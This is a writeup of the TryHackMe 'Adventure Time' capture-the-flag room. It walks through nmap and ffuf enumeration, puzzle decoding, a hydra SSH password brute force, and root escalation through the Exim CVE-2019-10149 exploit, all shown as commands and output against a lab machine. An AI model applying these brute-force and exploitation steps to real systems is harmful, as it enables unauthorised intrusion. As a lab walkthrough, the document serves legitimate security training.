---
title: "Adventure Time Writeup THM"
description: "My writeup of the TryHackMe room [Adventure Time](https://tryhackme.com/room/adventuretime)"
date: 2024-01-03T16:00:00+01:00
image: https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled.png
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Linux
    - Privilege Escalation
categories:
    - Room
    - Hard
---

I am going to do a nmap scan:

```bash
nmap -T4 -A  10.10.237.150

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-08 13:55 EST
Nmap scan report for 10.10.237.150
Host is up (0.057s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.65.91
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r--    1 ftp      ftp       1401357 Sep 21  2019 1.jpg
| -r--r--r--    1 ftp      ftp        233977 Sep 21  2019 2.jpg
| -r--r--r--    1 ftp      ftp        524615 Sep 21  2019 3.jpg
| -r--r--r--    1 ftp      ftp        771076 Sep 21  2019 4.jpg
| -r--r--r--    1 ftp      ftp       1644395 Sep 21  2019 5.jpg
|_-r--r--r--    1 ftp      ftp         40355 Sep 21  2019 6.jpg
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 58:d2:86:99:c2:62:2d:95:d0:75:9c:4e:83:b6:1b:ca (RSA)
|   256 db:87:9e:06:43:c7:6e:00:7b:c3:bc:a1:97:dd:5e:83 (ECDSA)
|_  256 6b:40:84:e6:9c:bc:1c:a8:de:b2:a1:8b:a3:6a:ef:f0 (ED25519)
80/tcp    open  http     Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
443/tcp   open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=adventure-time.com/organizationName=Candy Corporate Inc./stateOrProvinceName=Candy Kingdom/countryName=CK
| Not valid before: 2019-09-20T08:29:36
|_Not valid after:  2020-09-19T08:29:36
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: You found Finn
|_ssl-date: TLS randomness does not represent time
31337/tcp open  Elite?
| fingerprint-strings:
|   DNSStatusRequestTCP, RPCCheck, SSLSessionReq:
|     Hello Princess Bubblegum. What is the magic word?
|     magic word is not
|   DNSVersionBindReqTCP:
|     Hello Princess Bubblegum. What is the magic word?
|     magic word is not
|     version
|     bind
|   GenericLines, NULL:
|     Hello Princess Bubblegum. What is the magic word?
|   GetRequest:
|     Hello Princess Bubblegum. What is the magic word?
|     magic word is not GET / HTTP/1.0
|   HTTPOptions:
|     Hello Princess Bubblegum. What is the magic word?
|     magic word is not OPTIONS / HTTP/1.0
|   Help:
|     Hello Princess Bubblegum. What is the magic word?
|     magic word is not HELP
|   RTSPRequest:
|     Hello Princess Bubblegum. What is the magic word?
|     magic word is not OPTIONS / RTSP/1.0
|   SIPOptions:
|     Hello Princess Bubblegum. What is the magic word?
|     magic word is not OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|_    Accept: application/sdp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.94SVN%I=7%D=1/8%Time=659C452A%P=x86_64-pc-linux-gnu%r
SF:(NULL,32,"Hello\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\x20magi
SF:c\x20word\?\n")%r(GetRequest,57,"Hello\x20Princess\x20Bubblegum\.\x20Wh
SF:at\x20is\x20the\x20magic\x20word\?\nThe\x20magic\x20word\x20is\x20not\x
SF:20GET\x20/\x20HTTP/1\.0\n")%r(SIPOptions,124,"Hello\x20Princess\x20Bubb
SF:legum\.\x20What\x20is\x20the\x20magic\x20word\?\nThe\x20magic\x20word\x
SF:20is\x20not\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r\nVia:\x20SIP/2\.0/TCP\x2
SF:0nm;branch=foo\r\nFrom:\x20<sip:nm@nm>;tag=root\r\nTo:\x20<sip:nm2@nm2>
SF:\r\nCall-ID:\x2050000\r\nCSeq:\x2042\x20OPTIONS\r\nMax-Forwards:\x2070\
SF:r\nContent-Length:\x200\r\nContact:\x20<sip:nm@nm>\r\nAccept:\x20applic
SF:ation/sdp\n")%r(GenericLines,32,"Hello\x20Princess\x20Bubblegum\.\x20Wh
SF:at\x20is\x20the\x20magic\x20word\?\n")%r(HTTPOptions,5B,"Hello\x20Princ
SF:ess\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\nThe\x20magi
SF:c\x20word\x20is\x20not\x20OPTIONS\x20/\x20HTTP/1\.0\n")%r(RTSPRequest,5
SF:B,"Hello\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20wo
SF:rd\?\nThe\x20magic\x20word\x20is\x20not\x20OPTIONS\x20/\x20RTSP/1\.0\n"
SF:)%r(RPCCheck,75,"Hello\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\
SF:x20magic\x20word\?\nThe\x20magic\x20word\x20is\x20not\x20\x80\0\0\(r\xf
SF:e\x1d\x13\0\0\0\0\0\0\0\x02\0\x01\x86\xa0\0\x01\x97\|\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\n")%r(DNSVersionBindReqTCP,69,"Hello\x20Princess
SF:\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\nThe\x20magic\x
SF:20word\x20is\x20not\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03\n")%r(DNSStatusRequestTCP,57,"Hello\x20Princess\x
SF:20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\nThe\x20magic\x20
SF:word\x20is\x20not\x20\0\x0c\0\0\x10\0\0\0\0\0\0\0\0\0\n")%r(Help,4D,"He
SF:llo\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\
SF:nThe\x20magic\x20word\x20is\x20not\x20HELP\n")%r(SSLSessionReq,A1,"Hell
SF:o\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\nT
SF:he\x20magic\x20word\x20is\x20not\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\xd7
SF:\xf7\xba,\xee\xea\xb2`~\xf3\0\xfd\x82{\xb9\xd5\x96\xc8w\x9b\xe6\xc4\xdb
SF:<=\xdbo\xef\x10n\0\0\(\0\x16\0\x13\0\n\0f\0\x05\0\x04\0e\0d\0c\0b\0a\0`
SF:\0\x15\0\x12\0\t\0\x14\0\x11\0\x08\0\x06\0\x03\x01\0\n");
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.12 seconds
```

We see that we have a ftp server with some images in it.

I downloaded them and tried to upload a file, but it didn’t work out, so I am going to explore the web page.

In the http page there is nothing of interest, but in the https page there is a subdirectory that we can look for:

```bash
ffuf -u https://10.10.237.150:443/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.237.150:443/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms]
# Priority ordered case insensative list, where entries were found  [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 65ms]
#                       [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 63ms]
#                       [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 66ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 64ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 60ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 59ms]
# on atleast 2 different hosts [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 59ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms]
# Copyright 2007 James Fisher [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms]
# directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms]
#                       [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 62ms]
#                       [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 331ms]
                        [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms]
candybar                [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 66ms]
```

And we got a message:

![Untitled](https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled.png)

We can decypher with cyberchef:

![Untitled](https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled%201.png)

From there we can find this email address: bubblegum@land-of-ooo.com, which we should put in the hosts file.

Now that we found jake we should re-enumerate the website:

```bash
ffuf -u https://land-of-ooo.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://land-of-ooo.com/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 57ms]
# Copyright 2007 James Fisher [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 55ms]
# directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 56ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 55ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 55ms]
#                       [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 54ms]
#                       [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 54ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 56ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 57ms]
#                       [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 57ms]
# on atleast 2 different hosts [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 59ms]
# Priority ordered case insensative list, where entries were found  [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 61ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 328ms]
#                       [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 347ms]
yellowdog               [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 61ms]
                        [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 58ms]
```

We found another subdirectory

Another time:

```bash
ffuf -u https://land-of-ooo.com/yellowdog/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://land-of-ooo.com/yellowdog/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms]
#                       [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 61ms]
# Copyright 2007 James Fisher [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 60ms]
# directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 63ms]
#                       [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 58ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 57ms]
                        [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms]
# on atleast 2 different hosts [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 58ms]
# Priority ordered case insensative list, where entries were found  [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 63ms]
#                       [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 64ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 63ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 60ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 62ms]
                        [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms]
bananastock             [Status: 301, Size: 334, Words: 20, Lines: 10, Duration: 199ms]
```

And now we got another code:

![Untitled](https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled%202.png)

This time we got this:

![Untitled](https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled%203.png)

I tried to put that in the service running but no luck:

```bash
nc 10.10.237.150 31337
Hello Princess Bubblegum. What is the magic word?
THE BANANAS ARE THE BEST!!!
The magic word is not THE BANANAS ARE THE BEST!!!
```

So I just started another fuzzer

```bash
ffuf -u https://land-of-ooo.com/yellowdog/bananastock/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://land-of-ooo.com/yellowdog/bananastock/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 63ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms]
                        [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 54ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 55ms]
#                       [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 54ms]
#                       [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 68ms]
#                       [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 65ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 58ms]
# on atleast 2 different hosts [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 58ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 58ms]
# Copyright 2007 James Fisher [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms]
# Priority ordered case insensative list, where entries were found  [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 56ms]
#                       [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 328ms]
                        [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms]
princess                [Status: 301, Size: 343, Words: 20, Lines: 10, Duration: 58ms]
```

And finally we got what we were searching:

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/7fecbb84-9598-4ec2-9fa9-5ad99163bcf9/26707c7e-4328-4b37-9e1f-5b3357f3c284/Untitled.png)

This is either AES or DES,

![Untitled](https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled%205.png)

It was AES.

And we got that:

```bash
nc 10.10.237.150 31337
Hello Princess Bubblegum. What is the magic word?
ricardio
The new username is: apple-guards
```

So I tried using ssh with the password that we found before:

```bash
ssh apple-guards@10.10.237.150
The authenticity of host '10.10.237.150 (10.10.237.150)' can't be established.
ED25519 key fingerprint is SHA256:oousiKsHNim8zwOz0eyM11NPdqD8vdPNZ23JWmvYNSM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.237.150' (ED25519) to the list of known hosts.
apple-guards@10.10.237.150's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

1 package can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

No mail.
Last login: Sat Sep 21 20:51:11 2019 from 192.168.245.129
apple-guards@at:~$ whoami
apple-guards
```

There there are 2 flags, flag1, and flag, the flag one is encrypted in md5.

Since the hint tells us: (Can you search for someones files?)

I searched for the files owned by marceline:

```bash
find / -user marceline 2>/dev/null
/etc/fonts/helper
/home/marceline
```

```bash
./helper

======================================
      BananaHead Access Pass
       created by Marceline
======================================

Hi there bananaheads!!!
So you found my file?
But it won't help you if you can't answer this question correct.
What? I told you guys I would help and that it wouldn't cost you a thing....
Well I lied hahahaha

Ready for the question?

The key to solve this puzzle is gone
And you need the key to get this readable: Gpnhkse

Did you solve the puzzle?
```

I first tought that was rot13, but after seaching for a while I tried the vigenere one, which requires a key, that in this case would be “gone”

```bash
What is the word I'm looking for? Abadeer

That's it!!!! You solved my puzzle
Don't tell princess B I helped you guys!!!
My password is 'My friend Finn'
```

So we got marceline’s password

And we enter ssh with marceline with the password that we just found.

```bash
marceline@at:~$ ls
flag2  I-got-a-secret.txt
marceline@at:~$ cat I-got-a-secret.txt
Hello Finn,

I heard that you pulled a fast one over the banana guards.
B was very upset hahahahaha.
I also heard you guys are looking for BMO's resetcode.
You guys broke him again with those silly games?

You know I like you Finn, but I don't want to anger B too much.
So I will help you a little bit...

But you have to solve my little puzzle. Think you're up for it?
Hahahahaha....I know you are.

111111111100100010101011101011111110101111111111011011011011000001101001001011111111111111001010010111100101000000000000101001101111001010010010111111110010100000000000000000000000000000000000000010101111110010101100101000000000000000000000101001101100101001001011111111111111111111001010000000000000000000000000001010111001010000000000000000000000000000000000000000000001010011011001010010010111111111111111111111001010000000000000000000000000000000001010111111001010011011001010010111111111111100101001000000000000101001111110010100110010100100100000000000000000000010101110010100010100000000000000010100000000010101111100101001111001010011001010010000001010010100101011100101001101100101001011100101001010010100110110010101111111111111111111111111111111110010100100100000000000010100010100111110010100000000000000000000000010100111111111111111110010100101111001010000000000000001010
```

Apparently this is spoon code.

```bash
The magic word you are looking for is ApplePie
```

And finally we got the magic word.

Which tells us the peppermint password.

```bash
nc 10.10.237.150 31337
Hello Princess Bubblegum. What is the magic word?
ApplePie
The password of peppermint-butler is: That Black Magic
```

So now we can switch user and retrieve the flag:

```bash
su peppermint-butler
Password:
```

We can see a picture in the home directory.

```
find / -type f -user peppermint-butler 2>/dev/null | head
/usr/share/xml/steg.txt
/etc/php/zip.txt
/proc/1779/task/1779/fdinfo/0
/proc/1779/task/1779/fdinfo/1
/proc/1779/task/1779/fdinfo/2
/proc/1779/task/1779/fdinfo/255
/proc/1779/task/1779/environ
/proc/1779/task/1779/auxv
/proc/1779/task/1779/status
/proc/1779/task/1779/personality
peppermint-butler@at:~$ cat /usr/share/xml/steg.txt
I need to keep my secrets safe.
There are people in this castle who can't be trusted.
Those banana guards are not the smartest of guards.
And that Marceline is a friend of princess Bubblegum,
but I don't trust her.

So I need to keep this safe.

The password of my secret file is 'ToKeepASecretSafe'
peppermint-butler@at:~$ cat /etc/php/zip.txt
I need to keep my secrets safe.
There are people in this castle who can't be trusted.
Those banana guards are not the smartest of guards.
And that Marceline is a friend of princess Bubblegum,
but I don't trust her.

So I need to keep this safe.

The password of my secret file is 'ThisIsReallySave'
```

Using “ToKeepASecretSafe” as a password, we are able to find a zip file in the image:

```
steghide extract -sf butler-1.jpg
Enter passphrase:
wrote extracted data to "secrets.zip".
```

The zip is protected by a password, and we can unzip it using the other password “ThisIsReallySave”:

```
unzip secrets.zip
cat secrets.txt
[0200 hours][upper stairs]
I was looking for my arch nemesis Peace Master,
but instead I saw that cowering little puppet from the Ice King.....gunter.
What was he up to, I don't know.
But I saw him sneaking in the secret lab of Princess Bubblegum.
To be able to see what he was doing I used my spell 'the evil eye' and saw him.
He was hacking the secret laptop with something small like a duck of rubber.
I had to look closely, but I think I saw him type in something.
It was unclear, but it was something like 'The Ice King s????'.
The last 4 letters where a blur.

Should I tell princess Bubblegum or see how this all plays out?
I don't know.......
```

So now we know that the password starts with The Ice King s and has other 4 characters.

I used https://scrabblewordfinder.org/5-letter-words-starting-with/s to built a text file of possible that I’ll use with hydra.

```
hydra -l gunter -P passwords_gunter.txt ssh://10.10.237.150
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-07 17:39:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1564 login tries (l:1/p:1564), ~98 tries per task
[DATA] attacking ssh://10.10.237.150:22/
[STATUS] 181.00 tries/min, 181 tries in 00:01h, 1388 to do in 00:08h, 16 active
[STATUS] 124.00 tries/min, 372 tries in 00:03h, 1197 to do in 00:10h, 16 active
[STATUS] 117.57 tries/min, 823 tries in 00:07h, 748 to do in 00:07h, 16 active
[STATUS] 115.25 tries/min, 1383 tries in 00:12h, 188 to do in 00:02h, 16 active
[22][ssh] host: 10.10.237.150   login: gunter   password: The Ice King sucks
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-07 17:51:33
```

So, now we can go to the gunter home and retrieve the flag.

Now I am going to search for root SUIDs:

```
find / -user root -perm -u=s 2>/dev/null
/usr/sbin/pppd
/usr/sbin/exim4
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/arping
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sudo
/bin/ping
/bin/umount
/bin/su
/bin/fusermount
/bin/mount
```

Exim is a strange file.

```
exim4 --version
Exim version 4.90_1 #4 built 14-Feb-2018 16:01:14
Copyright (c) University of Cambridge, 1995 - 2017
(c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2017
Berkeley DB: Berkeley DB 5.3.28: (September  9, 2013)
Support for: crypteq iconv() IPv6 GnuTLS move_frozen_messages DKIM DNSSEC Event OCSP PRDR SOCKS TCP_Fast_Open
Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd
Authenticators: cram_md5 plaintext
Routers: accept dnslookup ipliteral manualroute queryprogram redirect
Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp
Fixed never_users: 0
Configure owner: 0:0
Size of off_t: 8
Configuration file is /var/lib/exim4/config.autogenerated
```

I found this exploit: https://raw.githubusercontent.com/AzizMea/CVE-2019-10149-privilege-escalation/master/wizard.py 

we can copy the script, change the port to the one that exim4 is running  and execute it.

```
python wizard.py
220 at ESMTP Exim 4.90_1 Ubuntu Sun, 07 Jun 2020 19:12:08 +0200

250 at Hello localhost [127.0.0.1]

250 OK

250 Accepted

354 Enter message, ending with "." on a line by itself

250 OK id=1jhyq8-0000r2-HW

whoami
root
```

So now we just want to find the last flag, which is in the bubblegum home.

```
cat bmo.txt

░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░▄██████████████████████▄░░░░
░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░
░░░░█░▄██████████████████▄░█░░░░
░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
░░░░█░█░░█░░░░░░░░░░░░█░░█░█░░░░
░░░░█░█░░░░░▄▄▄▄▄▄▄▄░░░░░█░█░░░░
░░░░█░█░░░░░▀▄░░░░▄▀░░░░░█░█░░░░
░░░░█░█░░░░░░░▀▀▀▀░░░░░░░█░█░░░░
░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
░█▌░█░▀██████████████████▀░█░▐█░
░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░
░█░░█░████████████░░░░░██░░█░░█░
░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░
░█░░█░░░░░░░░░░░░░░░▄░░░░░░█░░█░
░▀█▄█░░░▐█▌░░░░░░░▄███▄░██░█▄█▀░
░░░▀█░░█████░░░░░░░░░░░░░░░█▀░░░
░░░░█░░░▐█▌░░░░░░░░░▄██▄░░░█░░░░
░░░░█░░░░░░░░░░░░░░▐████▌░░█░░░░
░░░░█░▄▄▄░▄▄▄░░░░░░░▀██▀░░░█░░░░
░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░
░░░░▀██████████████████████▀░░░░
░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
